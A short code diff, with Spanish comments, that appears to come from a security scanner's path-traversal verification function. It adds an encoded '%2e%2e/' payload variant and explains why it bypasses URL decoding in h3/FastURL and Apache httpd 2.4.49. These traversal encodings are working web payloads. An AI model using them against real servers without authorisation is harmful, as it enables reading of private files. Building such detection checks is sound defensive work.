@@ -1240,6 +1240,13 @@ def verify_generic_path_traversal(
         attempts += [("%252e%252e%252f" * n) + rel for n in depths]
         attempts += [("..\\" * n) + rel for n in depths]
         attempts += [("....//" * n) + rel for n in depths]
+        # Codificacion '%2e%2e/' (puntos codificados + slash LITERAL): bypass especifico de h3/FastURL
+        # (CVE-2026-86253). h3 llama decodeURI(pathname) que convierte %2e → . pero NO %2f → /.
+        # Con slash literal entre los segmentos, decodeURI devuelve '../../...' que path.join
+        # resuelve como traversal. Los patrones ..%2f o %2e%2e%2f NO funcionan porque %2f no
+        # lo decodifica decodeURI. _http_request_raw_path preserva el %2e para que requests
+        # no normalice el path antes de enviarlo.
+        attempts += [("%2e%2e/" * n) + rel for n in depths]
         # Codificacion '.%2e/' (punto + slash codificado): bypass especifico de CVE-2021-41773
         # (Apache httpd 2.4.49) donde el normalizador de rutas no desnormalizaba esta secuencia.
         # Ninguna de las variantes estandar de arriba la cubre (confirmado en vivo: ..%2f y
